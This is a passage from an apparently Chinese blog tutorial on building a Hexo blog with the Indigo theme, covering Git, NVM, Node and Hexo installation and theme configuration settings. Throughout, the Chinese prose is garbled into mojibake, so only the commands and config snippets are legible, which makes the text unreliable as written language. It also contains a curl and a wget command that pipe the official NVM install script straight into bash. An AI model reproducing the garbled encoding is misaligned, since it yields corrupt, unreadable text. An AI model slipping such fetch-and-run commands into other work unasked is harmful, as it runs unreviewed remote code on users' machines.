å¯åŠ¨æ‰èƒ½åœ¨ MinTTY ä¸­å·¥ä½œï¼Œé»˜è®¤é€‰æ‹©è¿™ä¸ªæ›´çµæ´»ã€‚\n    2. ç¬¬äºŒä¸ªé€‰é¡¹ï¼Œä½¿ç”¨ Windows çš„é»˜è®¤æ§åˆ¶å°ï¼ˆcmd.exeï¼‰,å®ƒå¯ä»¥åœ¨ Win32 æ§åˆ¶å°ç¨‹åºä¸­å·¥ä½œï¼Œå¦‚äº¤äº’å¼ Python æˆ– node.jsï¼Œä½†æœ‰ä¸€ä¸ªéå¸¸æœ‰é™çš„é»˜è®¤æ»šåŠ¨å›æ»šï¼Œéœ€è¦é…ç½®ä¸ºä½¿ç”¨ Unicode å­—ä½“ï¼Œä»¥ä¾¿æ­£ç¡®æ˜¾ç¤ºé ascil å­—ç¬¦ï¼Œåœ¨ Windows 10 ä¹‹å‰ï¼Œå®ƒçš„çª—å£ä¸èƒ½è‡ªç”±è°ƒæ•´å¤§å°ï¼Œå®ƒåªå…è®¸çŸ©å½¢æ–‡æœ¬é€‰æ‹©\n\n11. é€‰æ‹© Git ä¸‹æ‹‰é»˜è®¤è¡Œä¸º\n\n    ![image-20230522092538730](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522092538730.png)\n\n    1. ç¬¬ä¸€ä¸ªé€‰é¡¹ï¼Œé»˜è®¤(å¿«è¿›æˆ–åˆå¹¶)ã€‚è¿™æ˜¯ â€œgit pullâ€ çš„æ ‡å‡†è¡Œä¸º:å°½å¯èƒ½å¿«è¿›å½“å‰åˆ†æ”¯åˆ°ä¸€ä¸ªè¢«æ•è·çš„åˆ†æ”¯ï¼Œå¦åˆ™åˆ›å»ºåˆå¹¶æäº¤ã€‚\n    2. ç¬¬äºŒä¸ªé€‰é¡¹ï¼Œå°†å½“å‰åˆ†æ”¯æ”¹ä¸ºè·å–çš„åˆ†æ”¯ã€‚å¦‚æœæ²¡æœ‰è¦é‡åŸºçš„æœ¬åœ°æäº¤ï¼Œè¿™ç›¸å½“äºå¿«è¿›ã€‚\n    3. ç¬¬ä¸‰ä¸ªé€‰é¡¹ï¼Œä»…ä»…å¿«è¿›ï¼Œ å¿«è¿›åˆ°è·å–çš„åˆ†æ”¯ã€‚å¦‚æœä¸å¯èƒ½ï¼Œå°±å¤±è´¥ã€‚\n\n12. é€‰æ‹© Git å‡­è¯å°åŠ©æ‰‹\n\n    ![image-20230522092633629](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522092633629.png)\n\n    Credential helperæ˜¯å¸®æˆ‘ä»¬ä¿å­˜å‡­è¯ï¼ˆç”¨æˆ·å¯†ç ï¼‰ä»–æœ‰å¾ˆå¤šå­˜å‚¨æ¨¡å¼å¦‚ï¼šcacheï¼Œstoreï¼Œmanager å’Œ osxkeychainï¼Œé»˜è®¤ wincredï¼Œè¿™é‡Œæ ¹æ®è‡ªå·±éœ€è¦é€‰æ‹©ã€‚\n\n13. é…ç½®é¢å¤–ç‰¹æ€§é€‰é¡¹\n\n    ![image-20230522092653359](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522092653359.png)\n\n    1. ç¬¬ä¸€ä¸ªé€‰é¡¹ï¼Œå¯ç”¨æ–‡ä»¶ç³»ç»Ÿç¼“å­˜,æ–‡ä»¶ç³»ç»Ÿæ•°æ®å°†è¢«å¤§é‡è¯»å–ï¼Œå¹¶ç¼“å­˜åˆ°å†…å­˜ä¸­ä»¥ç”¨äºæŸäº›æ“ä½œ(â€œcoreã€‚fscacheâ€ è®¾ç½®ä¸º â€trueâ€)ã€‚è¿™æä¾›äº†æ˜¾è‘—çš„æ€§èƒ½æå‡ã€‚\n    2. ç¬¬äºŒä¸ªé€‰é¡¹ï¼Œæ”¯æŒç¬¦å·é“¾æ¥ï¼Œå¯ç”¨ç¬¦å·é“¾æ¥(éœ€è¦ SeCreateSymboliclink æƒé™)ã€‚è¯·æ³¨æ„ï¼Œç°æœ‰å­˜å‚¨åº“ä¸å—æ­¤è®¾ç½®çš„å½±å“ã€‚\n\n14. å¯ç”¨å®éªŒé…ç½®é€‰é¡¹\n\n    ![image-20230522092726985](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522092726985.png)\n\n    å¯ç”¨å¯¹ä¼ªæ§åˆ¶å°çš„å®éªŒæ€§æ”¯æŒ,(æ–°)è¿™å…è®¸åœ¨Git Bashçª—å£ä¸­è¿è¡ŒåŸç”Ÿæ§åˆ¶å°ç¨‹åºï¼Œå¦‚ Node æˆ– Pythonï¼Œè€Œä¸ä½¿ç”¨ winptyï¼Œä½†å®ƒä»ç„¶æœ‰å·²çŸ¥çš„ bug,ä¸€èˆ¬ç”¨ä¸åˆ° å¯ä¸å‹¾é€‰\n\n    ç‚¹å‡» Install å³å¯å®‰è£…å®Œæ¯•ã€‚\n\n15. å®‰è£…å®Œæˆ\n\n    ![image-20230522092820600](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522092820600.png)\n\n    Git Bashï¼Œæ˜¯Gité…å¥—çš„ä¸€ä¸ªæ§åˆ¶å°\n\n16. å¯ç”¨\n\n    ![image-20230522092842772](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522092842772.png)\n\n#### å®‰è£… Hexo\n\nåœ¨ä¸Šé¢çš„ç¯å¢ƒéƒ½å®‰è£…å®Œæ¯•åï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤è¡Œå®‰è£… Hexo\n\n```\nnpm install hexo-cli -g\n```\n\nå®‰è£…å®ŒæˆåæŸ¥çœ‹ç‰ˆæœ¬ï¼Œå¦‚æœå¼¹å‡ºäº†ç‰ˆæœ¬å·å°±æ˜¯å®‰è£…æˆåŠŸäº†\n\n```\nhexo -v\n```\n\n### Mac/Linux\n\nMac å’Œ Linux éƒ½å¯ä»¥ä½¿ç”¨ç¼–è¯‘å®‰è£…çš„æ–¹æ³•å®‰è£… NVMï¼Œä½† Mac ç”¨æˆ·è¿˜æ˜¯æ¨èä½¿ç”¨ Homebrew æ¥å®‰è£… NVMã€‚\n\n#### å®‰è£… NVM\n\næœ¬æ•™ç¨‹æ¥è‡ªï¼šhttps://github.com/nvm-sh/nvm\n\nè¦å®‰è£…å’Œæ›´æ–° NVMï¼Œå¯ä»¥ä½¿ç”¨å®‰è£…è„šæœ¬ https://github.com/nvm-sh/nvm/blob/v0.39.3/install.shã€‚å¯ä»¥æ‰‹åŠ¨ä¸‹è½½è„šæœ¬æˆ–ä½¿ç”¨ Curl å’Œ Wget å‘½ä»¤è¿›è¡Œä¸‹è½½ï¼š\n\n```\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash\n```\n\n```\nwget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash\n```\n\nè¿è¡Œä¸Šè¿°ä»»ä¸€å‘½ä»¤éƒ½ä¼šä¸‹è½½è„šæœ¬å¹¶è¿è¡Œå®ƒã€‚\n\nè¯¥è„šæœ¬å°† nvm å­˜å‚¨åº“å…‹éš†åˆ° `~/.nvm`ï¼Œå¹¶å°è¯•å°†ä¸‹é¢ä»£ç æ®µä¸­çš„æºä»£ç è¡Œæ·»åŠ åˆ°æ­£ç¡®çš„é…ç½®æ–‡ä»¶ï¼ˆ`~/.bash_profile`ã€`~/.zshrc`ã€`~/.profile`æˆ–`~/.bashrc`ï¼‰\n\nä¹‹ååˆ°ç¯å¢ƒé…ç½®ä¸­è¿½åŠ ä¸‹è¿°å†…å®¹ï¼š\n\n```\nexport NVM_DIR=\"$([ -z \"${XDG_CONFIG_HOME-}\" ] && printf %s \"${HOME}/.nvm\" || printf %s \"${XDG_CONFIG_HOME}/nvm\")\"\n[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\" # This loads nvm\n```\n\nå®‰è£…å®Œæˆåï¼Œåœ¨ç»ˆç«¯è¾“å…¥ `nvm` æœªæŠ¥é”™ `command not find` å³ä¸ºå®‰è£…æˆåŠŸ\n\n#### é…ç½®å›½å†…æº\n\nåœ¨ç»ˆç«¯è¾“å…¥å¦‚ä¸‹å†…å®¹è¿›è¡Œè®¾ç½®å›½å†…æº\n\n```\nexport NVM_NODEJS_ORG_MIRROR=https://npm.taobao.org/mirrors/node/\n```\n\n#### å®‰è£… Node\n\nä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£… Node\n\n```\nnvm install 12.21\n```\n\nå¯ä»¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ç”¨\n\n```\nnvm list\nnvm use 12.21\nnode -v\n```\n\n#### å®‰è£… Git\n\n##### Centos\n\n```\nyum install git -y\n```\n\nåœ¨ Centos ä¸‹å¯ä»¥ä½¿ç”¨ yum å®‰è£…ç¨‹åº\n\n##### Ubuntu\n\n```\napt install git -y\n```\n\nåœ¨ Ubuntu ç­‰ Debian æ¶æ„ä¸‹å¯ä»¥ä½¿ç”¨ apt å®‰è£…ç¨‹åº\n\n#### å®‰è£… Hexo\n\nåœ¨ä¸Šé¢çš„ç¯å¢ƒéƒ½å®‰è£…\n\nåœ¨ä¸Šé¢çš„ç¯å¢ƒéƒ½å®‰è£…å®Œæ¯•åï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤è¡Œå®‰è£… Hexo\n\n```\nnpm install hexo-cli -g\n```\n\nå®‰è£…å®ŒæˆåæŸ¥çœ‹ç‰ˆæœ¬ï¼Œå¦‚æœå¼¹å‡ºäº†ç‰ˆæœ¬å·å°±æ˜¯å®‰è£…æˆåŠŸäº†\n\n```\nhexo -v\n```\n\n### Mac ä¸“å±\n\n#### å®‰è£… NVM\n\nåœ¨å®‰è£… Homebrew çš„æƒ…å†µä¸‹ï¼Œç»ˆç«¯è¾“å…¥ï¼š\n\n```\nbrew install nvm\n```\n\nå³å¯å®Œæˆå®‰è£…\n\n#### é…ç½®å›½å†…æº\n\nåœ¨ç»ˆç«¯è¾“å…¥å¦‚ä¸‹å†…å®¹è¿›è¡Œè®¾ç½®å›½å†…æº\n\n```\nexport NVM_NODEJS_ORG_MIRROR=https://npm.taobao.org/mirrors/node/\n```\n\n#### å®‰è£… Node\n\nä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£… Node\n\n```\nnvm install 12.21\n```\n\nå¯ä»¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ç”¨\n\n```\nnvm list\nnvm use 12.21\nnode -v\n```\n\n#### å®‰è£… Git\n\n##### ç›´æ¥å®‰è£…\n\nåœ¨ Mac ä¸‹æ˜¯ä¼šé»˜è®¤å®‰è£… Git çš„\n\n```\ngit --version\n```\n\nå¯ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤æŸ¥çœ‹æ˜¯å¦å®‰è£…ï¼Œå¦‚æœå·²ç»å®‰è£…ä¼šè¾“å‡º git çš„ç‰ˆæœ¬\n\n![d570604a-c09d-4d84-82e0-df78af411f5a](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/d570604a-c09d-4d84-82e0-df78af411f5a.png)\n\nå¦‚æœæ²¡æœ‰å®‰è£…çš„è¯ï¼Œä¼šå¼¹å‡ºä¸Šè¿°çª—å£è¿›è¡Œå®‰è£…\n\n![c1cb0d85-468f-4928-ba8b-51586e7c6797](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/c1cb0d85-468f-4928-ba8b-51586e7c6797.png)\n\nç‚¹å‡»åŒæ„å³å¯\n\n##### Brew å®‰è£…\n\nå¯ä»¥åˆ©ç”¨ Brew å·¥å…·åŒ…ç®¡ç†å™¨è¿›è¡Œ Git å®‰è£…ï¼Œå®‰è£…æ–¹æ³•æˆ‘ä¼šåœ¨å¦ä¸€ç¯‡ Mac M1 æ¸—é€æµ‹è¯•ç¯å¢ƒæ­å»ºçš„æ–‡ç« ä¸­å†™ï¼Œæˆ‘å°±ä¸åœ¨è¿™é‡Œèµ˜è¿°äº†\n\n```\nbrew install git\n```\n\nç„¶åç­‰å¾…å®‰è£…å®Œæˆå°±è¡Œ\n\n#### å®‰è£… Hexo\n\nåœ¨ä¸Šé¢çš„ç¯å¢ƒéƒ½å®‰è£…å®Œæ¯•åï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤è¡Œå®‰è£… Hexo\n\n```\nnpm install hexo-cli -g\n```\n\nå®‰è£…å®ŒæˆåæŸ¥çœ‹ç‰ˆæœ¬ï¼Œå¦‚æœå¼¹å‡ºäº†ç‰ˆæœ¬å·å°±æ˜¯å®‰è£…æˆåŠŸäº†\n\n```\nhexo -v\n```\n\n# Hexo éƒ¨ç½²åšå®¢\n\n## åšå®¢æ­å»º\n\nåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿›å…¥æ–‡ä»¶å¤¹åç„¶åä½¿ç”¨ hexo è¿›è¡Œåˆå§‹åŒ–\n\n```\nhexo init\n```\n\nç„¶åå°±åˆ›å»ºå®Œæˆäº†æˆ‘ä»¬çš„åˆå§‹åŒ–åšå®¢\n\n```\nhexo s\n```\n\nå³å¯åœ¨æœ¬åœ°éƒ¨ç½²åšå®¢ï¼Œå³å¯åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€\n\n![](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230607094544458.png)\n\næˆ‘ä»¬æ¥åˆ›å»ºç¬¬ä¸€ç¯‡å†…å®¹\n\n```\nhexo new test1\n```\n\n```\nhexo s\n```\n\nç„¶åå†ç”¨ hexo g ç¼–è¯‘åšå®¢\n\nç„¶åä½¿ç”¨ hexo s åœ¨æœ¬åœ°éƒ¨ç½²åšå®¢\n\nå°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç¬¬ä¸€ç¯‡åšå®¢\n\n![image-20230607095025249](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230607095025249.png)\n\n## ä¸»é¢˜æ›´æ¢\n\nåšå®¢æ­å»ºå¥½äº†ï¼Œæ¥ä¸‹æ¥éœ€è¦æ¢ä¸€ä¸ªæ»¡æ„çš„åšå®¢ä¸»é¢˜\n\n> https://hexo.io/themes/\n\nå¯ä»¥åœ¨ä¸Šé¢é€‰æ‹©å–œæ¬¢çš„ä¸»é¢˜\n\n![](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230612223319147.png)\n\nè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯ `Indigo`\n\n> https://github.com/yscoder/hexo-theme-indigo\n\nè¿›å…¥åˆ° hexo ç›®å½•ä¸­çš„ themes ç›®å½•ä¸­\n\n```\ngit clone https://github.com/yscoder/hexo-theme-indigo\n```\n\nå°†ä¸»é¢˜ä¸‹è½½åˆ°å½“å‰ç›®å½•ä¸‹\n\nè¿”å› hexo çš„æ ¹ç›®å½•ä¸­ï¼Œæ‰“å¼€é…ç½®æ–‡ä»¶ `_config.yml`ï¼Œå»ä¿®æ”¹å†…å®¹\n\n```\n# Extensions\n## Plugins: https://hexo.io/plugins/\n## Themes: https://hexo.io/themes/\ntheme: landscape\n```\n\nå°†ç¬¬ 100 è¡Œçš„ `theme: landscape` ä¿®æ”¹ä¸º `hexo-theme-indigo` \n\n### ä¾èµ–å®‰è£…\n\n#### Less\n\nä¸»é¢˜é»˜è®¤ä½¿ç”¨ less ä½œä¸º css é¢„å¤„ç†å·¥å…·\n\n```\nnpm install hexo-renderer-less --save\n```\n\n#### Feed\n\nç”¨äºç”Ÿæˆ rss\n\n```\nnpm install hexo-generator-feed --save\n```\n\n#### json-content\n\nç”¨äºç”Ÿæˆé™æ€ç«™ç‚¹æ•°æ®ï¼Œç”¨äºç«™å†…æœç´¢çš„æ•°æ®æº\n\n```\nnpm install hexo-generator-json-content --save\n```\n\n#### QRCode\n\nå¯é€‰ï¼Œä¸å®‰è£…æ—¶ä¼šè¯·æ±‚ jiathis Api ç”ŸæˆäºŒç»´ç \n\n```\nnpm install hexo-helper-qrcode --save\n```\n\n#### çº é”™\n\nè¿™ä¸ªæ—¶å€™ç›´æ¥è¿è¡Œä¸€ä¸‹\n\n```\nhexo g\nhexo s\n```\n\n![image-20230613132219884](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230613132219884.png)\n\nå‘ç°æŠ¥é”™äº†ï¼Œç½‘é¡µä¹Ÿæ— æ³•è®¿é—®\n\nç»è¿‡å¤§é‡çš„è¸©å‘å’Œæ’æŸ¥ï¼Œæœ€åå‘ç°æ˜¯å› ä¸ºé»˜è®¤å®‰è£…çš„ä¸º `hexo 5`ï¼Œè€Œå®ƒä¸å†æŠŠ `_` ä½œä¸ºå…¨å±€å˜é‡\n\n> https://hexo.io/docs/variables#Global-Variables\n\nè¿™é‡Œåˆ‡æ¢ä¸º `hexo 4` å³å¯è§£å†³è¿™ä¸ªé—®é¢˜\n\n```\nnpm uninstall hexo --save\nnpm install hexo@^4.0.0 --save\n```\n\nç„¶åå†å°è¯•æ­å»ºæœåŠ¡å™¨\n\n```\nhexo g\nhexo s\n```\n\n![image-20230613132539430](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230613132539430.png)\n\næˆåŠŸæ­å»ºå¹¶è®¿é—®\n\n### ç«™ç‚¹é…ç½®\n\n#### å¼€å¯æ ‡ç­¾é¡µ\n\n```\nhexo new page tags\n```\n\nä¿®æ”¹ `hexo/source/tags/index.md` çš„å…ƒæ•°æ®\n\n```\nlayout: tags\ncomments: false\n---\n```\n\n#### å¼€å¯åˆ†ç±»é¡µ\n\nä»… card theme æ”¯æŒã€‚\n\n```\nhexo new page categories\n```\n\nä¿®æ”¹ `hexo/source/categories/index.md` çš„å…ƒæ•°æ®\n\n```\nlayout: categories\ncomments: false\n---\n```\n\n#### åŸºæœ¬é…ç½®\n\nä¸ºäº†å¾—åˆ°æ›´å¥½çš„ä½¿ç”¨ä½“éªŒï¼Œä»¥ä¸‹å†…å®¹è¯·åŠ¡å¿…å¡«å†™å®Œæ•´ï¼Œå› ä¸ºè¿™äº›å†…å®¹ä¼šåœ¨ä¸»é¢˜ä¸­å¾—åˆ°å±•ç¤ºã€‚[æ›´å¤š](https://hexo.io/zh-cn/docs/configuration.html)\n\n```\ntitle: your title\nsubtitle: your subtitle\ndescription: your description\nkeywords: your keywords\nauthor: your name\nemail: your email\nurl: your site url\n```\n\n#### Feed é…ç½®\n\nå‚è€ƒ [hexo-generator-feed](https://github.com/hexojs/hexo-generator-feed)\n\n```\nfeed:\n  type: atom\n  path: atom.xml\n  limit: 0\n```\n\n#### jsonContent é…ç½®\n\nä¸ºäº†èŠ‚çº¦èµ„æºï¼Œå¯ä»¥å¯¹ jsonContent æ’ä»¶ç”Ÿæˆçš„æ•°æ®å­—æ®µè¿›è¡Œé…ç½®ï¼Œå‡å°‘æ•°æ®æ–‡ä»¶å¤§å°ã€‚å‚è€ƒ [hexo-generator-json-content](https://github.com/alexbruno/hexo-generator-json-content)\n\n```\njsonContent:\n  meta: false\n  pages: false\n  posts:\n    title: true\n    date: true\n    path: true\n    text: true\n    raw: false\n    content: false\n    slug: false\n    updated: false\n    comments: false\n    link: false\n    permalink: false\n    excerpt: false\n    categories: false\n    tags: true\n```\n\n#### ä¸»é¢˜é…ç½®\n\nç¼–è¾‘ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œ`themes/indigo/_config.yml`ã€‚\n\n#### å·¦ä¾§èœå•\n\né»˜è®¤é…ç½®å¦‚ä¸‹\n\n```\nmenu:\n  home:\n    text: ä¸»é¡µ\n    url: /\n  archives:\n    url: /archives\n  tags:\n    url: /tags\n  github:\n    url: https://github.com/yscoder\n    target: _blank\n  weibo:\n    url: http://www.weibo.com/ysweb\n    target: _blank\n  link:\n    text: æµ‹è¯•\n    url: /\n```\n\næ·»åŠ æ–°èœå•é¡¹æ—¶ï¼Œåœ¨ menu ä¸‹å¢åŠ å­å±æ€§å³å¯ã€‚å±æ€§è¯´æ˜å¦‚ä¸‹ï¼š\n\n```\nmenu:\n link:               # fontawesomeå›¾æ ‡ï¼Œçœç•¥å‰ç¼€ï¼Œæœ¬ä¸»é¢˜å‰ç¼€ä¸º icon-ï¼Œå¿…é¡»\n   text: About       # èœå•æ˜¾ç¤ºçš„æ–‡å­—ï¼Œå¦‚æœçœç•¥å³é»˜è®¤ä¸å›¾æ ‡ä¸€è‡´ï¼Œé¦–å­—æ¯ä¼šè½¬å¤§å†™\n   url: /about       # é“¾æ¥ï¼Œç»å¯¹æˆ–ç›¸å¯¹è·¯å¾„ï¼Œå¿…é¡»\n   target: _blank    # æ˜¯å¦è·³å‡ºï¼Œçœç•¥åˆ™åœ¨å½“å‰é¡µé¢æ‰“å¼€\n```\n\nfontawesome å›¾æ ‡å·²é›†æˆåˆ°ä¸»é¢˜ä¸­ï¼Œä½ å¯ä»¥åˆ° [è¿™ä¸ªé¡µé¢](http://fontawesome.io/icons/) æŒ‘é€‰åˆé€‚çš„å›¾æ ‡ã€‚\n\n#### favicon\n\nç«™ç‚¹ logoï¼Œæ˜¾ç¤ºåœ¨æµè§ˆå™¨å½“å‰æ ‡ç­¾é¡µå·¦ä¸Šè§’ã€‚\n\n```\nfavicon: /favicon.ico\n```\n\n#### å¤´åƒ\n\nä½äºå·¦ä¾§èœå•ä¸Šæ–¹ï¼ˆå®˜æ–¹ä»‹ç»ï¼Œä½†æˆ‘æµ‹è¯•åå‘ç°æ— æ•ˆï¼‰\n\n```\navatar: /img/logo.jpg\n```\n\n#### Email\n\nå¤´åƒä¸‹æ–¹\n\n```\nemail: LucifielHack@qq.com\n```\n\n#### color\n\nè®¾ç½® Android L Chrome æµè§ˆå™¨çŠ¶æ€æ é¢œè‰²ï¼Œä¸éœ€è¦å¯å»é™¤æ­¤é¡¹æˆ–è®¾ä¸º `false`ã€‚\n\n```\ncolor: '#3F51B5'\n```\n\n#### é¡µé¢æ ‡é¢˜ï¼ˆcard themeï¼‰\n\nè‡ªå®šä¹‰å½’æ¡£ã€æ ‡ç­¾ã€åˆ†ç±»é¡µçš„å¤§æ ‡é¢˜ã€‚\n\n```\ntags_title: Tags\narchives_title: Archives\ncategories_title: Categories\n```\n\n#### æ–‡ç« æ‘˜è¦\n\nå¯ä»¥åœ¨ Markdown æ–‡ä»¶ä¸­åŠ  `<!--more-->`ä»¥åˆ†å‰²æ‘˜è¦ä¸æ–‡ç« æ­£æ–‡ã€‚æœªè®¾ç½®æ—¶ï¼ŒæŒ‰ `excerpt_length` è®¾ç½®æˆªå–ã€‚\n\n```\n# æ–‡ç« æ‘˜è¦æ¸²æŸ“æ–¹å¼: ä¸º true æ—¶å°†æ¸²æŸ“ä¸º htmlï¼Œå¦åˆ™ä¸ºæ–‡æœ¬\nexcerpt_render: false\n# æˆªæ–­é•¿åº¦\nexcerpt_length: 200\n# æ–‡å­—æ­£æ–‡é¡µé“¾æ¥æ–‡å­—\nexcerpt_link: é˜…è¯»å…¨æ–‡...\n```\n\n#### mathjax\n\nå¼€å¯åï¼Œä½¿ä½ çš„ç«™ç‚¹æ”¯æŒå…¬å¼æ¸²æŸ“ï¼Œby [mathjax](https://www.mathjax.org/)ã€‚ è¯·æŒ‰éœ€å¼€å¯ï¼Œå› ä¸ºæ­¤é¡¹éœ€è¦åŠ è½½é¢å¤–çš„ js æ–‡ä»¶ã€‚\n\n```\nmathjax: false\n```\n\n#### åˆ†äº«\n\næ–‡ç« åˆ†äº«å¼€å…³ï¼Œby [jiathis-api](http://www.jiathis.com/help/html/share-with-jiathis-api)ã€‚\n\n```\nshare: true\n```\n\n#### æ–‡ç« æ‰“èµ\n\né»˜è®¤å¼€å¯\n\n```\nreward:\n  title: è°¢è°¢å¤§çˆ·~             #æ˜¾ç¤ºçš„æ–‡å­—\n  wechat: /img/wechat.jpg     #å¾®ä¿¡ï¼Œå…³é—­è®¾ä¸º false\n  alipay: /img/alipay.jpg     #æ”¯ä»˜å®ï¼Œå…³é—­è®¾ä¸º false\n```\n\næ­¤å¤–åœ¨ crad theme ä¸­ï¼Œå¯ä»¥é€šè¿‡åœ¨ markdown å¤´éƒ¨æ·»åŠ  `reward: false` æ¥æ§åˆ¶æŸäº›ä¸æƒ³å¼€å¯æ‰“èµçš„é¡µé¢ã€‚\n\nå…³é—­\n\n```\nreward: false\n```\n\n> äºŒç»´ç è¯·è‡ªè¡Œä»å¾®ä¿¡ã€æ”¯ä»˜å®ä¸­ä¸‹è½½ã€‚å½“ä¸¤ä¸ªäºŒç»´ç åŒæ—¶å­˜åœ¨æ—¶ï¼Œä¸ºä¿æŒæ˜¾ç¤ºæ•ˆæœçš„ä¸€è‡´æ€§ï¼Œæ³¨æ„æˆªå›¾æ—¶çš„è¾¹æ¡†ç•™ç™½ä¿æŒä¸€è‡´ã€‚å¿…è¦æ—¶å¯å€ŸåŠ©PSç­‰å›¾ç‰‡å¤„ç†å·¥å…·è¿›è¡Œå›¾ç‰‡å¤§å°è£å‰ªã€å‹ç¼©ç­‰ã€‚\n\n#### ç«™å†…æœç´¢\n\næ˜¯å¦å¼€å¯æœç´¢\n\n```\nsearch: true\n```\n\n#### å¸ƒå±€\n\nå¼€å¯åï¼Œæ–‡ç« é¡µåœ¨å¤§å±ä¸‹ä¼šéšè—å·¦ä¾§èœå•ï¼Œä¸“æ³¨é˜…è¯»ã€‚\n\n```\nhideMenu: true\n```\n\n#### Toc\n\nå¼€å¯æ–‡ç« å†…å®¹å¯¼èˆªã€‚\n\n```\n#toc: false  #å…³é—­\ntoc:\n  list_number: false  # å†³å®šå¯¼èˆªä½¿ç”¨çš„æ ‡ç­¾ï¼Œ true ä¸º olï¼Œ false ä¸º ulã€‚\n```\n\n#### copyrightï¼ˆcard themeï¼‰\n\næ–‡ç« é¡µç‰ˆæƒå£°æ˜å†…å®¹ï¼Œhexoä¸­æ‰€æœ‰å˜é‡åŠè¾…åŠ©å‡½æ•°ç­‰å‡å¯è°ƒç”¨ï¼Œå…·ä½“è¯·æŸ¥é˜… [hexo.io](http://hexo.io/)ã€‚\n\n```\ncopyright: è¿™é‡Œå†™ç•™è¨€æˆ–ç‰ˆæƒå£°æ˜ï¼š<a href=\"<%- url_for(page.path) %>\" target=\"_blank\" rel=\"external\"><%- url %></a>\n```\n\n#### Less\n\nè®¾ç½® less ç¼–è¯‘æ—¶çš„å…¥å£æ–‡ä»¶è·¯å¾„ï¼Œ[hexo-renderer-less](https://github.com/hexojs/hexo-renderer-less)ã€‚\n\n```\nless:\n  compress: true    # æ˜¯å¦å‹ç¼©css\n  paths:\n    - source/css/style.less\n```\n\n#### è¯„è®º\n\né›†æˆäº† [disqus](https://disqus.com/)ã€[å‹è¨€](http://www.uyan.cc/)ã€[gitment](https://github.com/imsun/gitment) å’Œ [valine](https://valine.js.org/)ï¼Œå¼€å¯å…¶ä¸€å³å¯ã€‚\n\n#### æ•°æ®ç»Ÿè®¡\n\né›†æˆçš„æœ‰è°·æ­Œã€è…¾è®¯ã€ç™¾åº¦å’Œ CNZZï¼Œè¯·å¡«å†™ä½ çš„ç«™ç‚¹æ ‡è¯†ã€‚\n\n```\ngoogle_analytics: key\ntajs: ç«™ç‚¹id\nbaidu_tongji: ç«™ç‚¹id\ncnzz: ç«™ç‚¹id\n```\n\n#### è°·æ­Œç«™ç‚¹éªŒè¯ï¼ˆcard themeï¼‰\n\n```\ngoogle_site_verification: false\n```\n\n#### è§„èŒƒç½‘å€ï¼ˆcard themeï¼‰\n\nè®©æœç´¢å¼•æ“é‡å®šå‘ä½ çš„ä¸åŒåŸŸåã€ä¸åŒå­åŸŸã€åŒåŸŸä¸åŒç›®å½•çš„ç«™ç‚¹åˆ°ä½ æœŸæœ›çš„è·¯å¾„ã€‚[ä½¿ç”¨è§„èŒƒç½‘å€](https://support.google.com/webmasters/answer/139066)\n\n```\ncanonical: http://imys.net\n```\n\n#### ç‰ˆæƒèµ·å§‹å¹´ä»½\n\n```\nsince_year: 2006\n```\n\n#### è‡ªå®šä¹‰é¡µé¢å…³äº\n\nç”¨æˆ·é¡µé¢ä¸­ä½œè€…ç›¸å…³çš„æè¿°æ€§æ–‡å­—ï¼Œå¦‚ä¸éœ€è¦è®¾ä¸º false\n\n```\nabout: ç”¨æˆ·é¡µé¢ä¸­ä½œè€…ç›¸å…³çš„æè¿°æ€§æ–‡å­—ï¼Œå¦‚ä¸éœ€è¦è®¾ä¸º false\n```\n\n#### CDN\n\nå¼€å¯åå°†ä½¿ç”¨ unpkg cdn æœ€æ–°çš„ä¸»é¢˜æ ·å¼ï¼Œå¦‚æœæƒ³è®©ä½ çš„è‡ªå®šä¹‰æ ·å¼ç”Ÿæ•ˆï¼ŒæŠŠæ­¤é¡¹è®¾ä¸º `false`ã€‚\n\n```\ncdn: true\n```\n\n#### lightbox\n\næ–‡ç« å›¾ç‰‡ç¯ç®±æ•ˆæœã€‚\n\n```\nlightbox: true\n```\n\n#### ICP å¤‡æ¡ˆå·\n\n```\nICP_license: äº¬ICPå¤‡1234556å·-1\n```\n\n## ä½¿ç”¨ Github æ­å»ºåšå®¢\n\n### æ³¨å†Œ Github è´¦å·\n\nä½¿ç”¨ Github 